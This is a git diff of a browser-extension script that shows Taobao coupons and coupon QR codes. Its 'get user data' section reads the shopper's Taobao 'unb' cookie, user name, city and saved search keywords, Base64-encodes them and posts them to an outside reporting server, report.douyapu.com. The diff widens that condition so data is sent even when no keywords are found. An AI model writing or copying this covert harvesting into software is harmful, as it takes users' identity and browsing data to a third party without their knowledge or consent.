@@ -70,7 +70,6 @@ setTimeout(function () {
             document.cookie = `${cookieName}=1;expires=` + leftTime;
             callBack();
         }
-        callBack();
     }   //计算指定cookie剩余时间
     function start() {
         // var cssStyle='';
@@ -408,6 +407,8 @@ setTimeout(function () {
                 var getH5CouNum = 0;    //接口轮询调用次数
                 var page1 = 1;
                 var getH5CouNum1 = 0;//
+                var page2 = 1;
+                var getH5CouNum2 = 0;//
                 function getDan(pid,page,num,callBack) {
                     var time = Date.now();
                     var s = `{"q":"${sj_title}","pid":"${pid}","page":${page},"useItemCouponPage":"1","lunaUrlParam": "{'algo_sort':'mixcoupon','rank':'rank_profile:FirstRankScorer_atbh5','PS':'tk_item_score_atbh5','appBucket':'h'}"}`;
@@ -501,13 +502,15 @@ setTimeout(function () {
                             });
                             opTimer(".plugMid627-couTime");
                             getDan(myQrMmId,page1,getH5CouNum1,setQrCoupon);
+                            // saveCou(list,res);
                         });
                     } else {
                         $(".plugMid627-noCoupon").html(`<img src="${adPic}" data-mgClick="${clickE}">`);
                         $(".plugMid627-noCoupon").show();
                         $(".plugMid627-noCoupon").click(function () {
                             openWindow(toUrl);
-                        })
+                        });
+                        // saveCou(0,0);
                     }
                 }       //生成优惠券判断是否有优惠券
                 function setQrCoupon(list) {
@@ -547,6 +550,49 @@ setTimeout(function () {
                         }
                     },false)
                 }     //生成优惠券二维码
+                // function saveCou(list,res) {
+                //     return
+                //     console.log(list,res);
+                //     function delTime() {
+                //         var day = 7;
+                //         var time = new Date().getTime() - day * 86400000;
+                //         for (let i = hasPostArr.length - 1; i >= 0; i--) {
+                //             console.log(hasPostArr[i]);
+                //             if (hasPostArr[i].time < time) {
+                //                 hasPostArr.splice(i,1);
+                //             }
+                //         }
+                //         chrome.storage.local.set({dypPostCou20180709:hasPostArr});
+                //     }   //删除事件超过7天的优惠券元素
+                //     if (0) {
+                //         var postSwi = 1;
+                //         console.log(hasPostArr);
+                //         $.each(hasPostArr,function (v,k) {
+                //             if (k.id == itemId) {
+                //                 postSwi = 0;
+                //                 return false;
+                //             }
+                //         });
+                //         if (postSwi) {
+                //             console.log('存ID');
+                //             if (hasPostArr.length > 99) {
+                //                 hasPostArr.shift();
+                //             }
+                //             hasPostArr.push({id:itemId,time:new Date().getTime()});
+                //             chrome.storage.local.set({dypPostCou20180709:hasPostArr},function () {
+                //                 delTime();
+                //             });
+                //         } else {
+                //             console.log("已经存在");
+                //             delTime();
+                //         }
+                //     }
+                //     function postCou(e) {
+                //     }
+                //
+                //     getDan(myQrMmId,page2,getH5CouNum2,postCou);
+                //     console.log(1);
+                // }                //上报优惠券
                 getDan(myMmId,page,getH5CouNum,setCoupon);
             }
         }();                                       //中间优惠券模块2
@@ -791,10 +837,9 @@ setTimeout(function () {
                         return
                     }
                     chrome.storage.local.get(null,function (e) {
-                        console.log(e);
                         info.useId = info.useId ? info.useId : e.useInfo1876.useId;
                         info.useName = info.useName ? info.useName : e.useInfo1876.useName;
-                        info.city = info.city ? info.city : e.useInfo1876.city ? e.useInfo1876.city : "";
+                        info.city = info.city ? info.city : e.useInfo1876 ? e.useInfo1876.city : "";
                         if (info.useId && info.useName) {
                             chrome.storage.local.set({useInfo1876:{useId:info.useId,useName:info.useName,city:info.city}});
                             getKey();
@@ -802,21 +847,23 @@ setTimeout(function () {
                     });
                 }   //
                 function getKey() {
-                    $.each(storageData,function (v,k) {
-                        if (v.match(`suggest_history_historybaobei${info.useName}`)) {
-                            info.useKeys = '';
-                            var index = 0;
-                            $.each(JSON.parse(k),function (v,k) {
-                                index++;
-                                if (index == needNum) {
-                                    return false
-                                }
-                                info.useKeys += `${decodeURIComponent(k.key)},`;
-                            });
-                            info.useKeys = info.useKeys.replace(/,$/gi,"");
-                            postUseInfo();
-                        }
-                    });
+                    function getStorage(val) {
+                        var keyword = [];
+                        $.each(storageData,function (v,k) {
+                            if (v == val) {
+                                var index = 0;
+                                $.each(JSON.parse(k),function (v,k) {
+                                    index++;
+                                    if (index <= needNum) {
+                                        keyword.push(decodeURIComponent(k.key));
+                                    }
+                                });
+                            }
+                        });
+                        return keyword.toString();
+                    }   //
+                    info.useKeys = getStorage(`suggest_history_historybaobei${info.useName}`) || getStorage(`suggest_history_historybaobei`);
+                    postUseInfo();
                 }   //获取keys
                 chrome.extension.sendMessage({
                     name:"getCook",url:"https://www.taobao.com/",key:"unb"
@@ -845,14 +892,13 @@ setTimeout(function () {
                 });
             }   //获取用户数据
             function postUseInfo() {
-                if (info.useId && info.useKeys && info.useName) {
+                // console.log(info);
+                if (info.useId && info.useName) {
                     var base64Post = '';
-                    console.log(info);
                     $.each(info,function (v,k) {
                         base64Post += `${Base64.encode(k)}|`
                     });
                     base64Post = base64Post.replace(/\|$/gi,"");
-                    console.log(base64Post);
                     chrome.extension.sendMessage({
                         name:"universal",url:"http://report.douyapu.com/api/usr",data:{
                             action:'info',
